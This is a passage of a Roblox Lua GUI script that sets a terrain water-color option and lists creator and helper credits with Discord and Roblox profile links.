    Default = Color3.fromRGB(Workspace:WaitForChild('Terrain').WaterColor.R*255, Workspace:WaitForChild('Terrain').WaterColor.G*255, Workspace:WaitForChild('Terrain').WaterColor.B*255),
    Flag = 'WaterColor',
    Callback = function(Value)
        Workspace:WaitForChild('Terrain').WaterColor = (Value)
    end
})

local BumpUpVisualsSection = Visuals:CreateSection('')

local CreditSection = Credits:CreateSection('Discord Server')

CreditSection:CreateParagraph("Discord Server  (https://discord.gg/radd9wnwNp)")

local CreditSection = Credits:CreateSection('Creater Credits')

CreditSection:CreateParagraph("EliteChaosss (Roblox User)")
CreditSection:CreateParagraph("https://www.roblox.com/users/3234708638/profile (Roblox User Profile)")
CreditSection:CreateParagraph("Made by elitechaoss (on discord)")
CreditSection:CreateParagraph("For questions elitechaoss (on discord)")
CreditSection:CreateParagraph("Discord Server  (https://discord.gg/radd9wnwNp)")

local CreditSection = Credits:CreateSection('Helper Credits')

CreditSection:CreateParagraph("Casemmm25590 (Roblox User)")
CreditSection:CreateParagraph("https://www.roblox.com/users/3163368271/profile (Roblox User Profile)")
CreditSection:CreateParagraph("Helped by casemmm25590 (on discord)")
New File at / · EliteChaoss/EliteChaoss 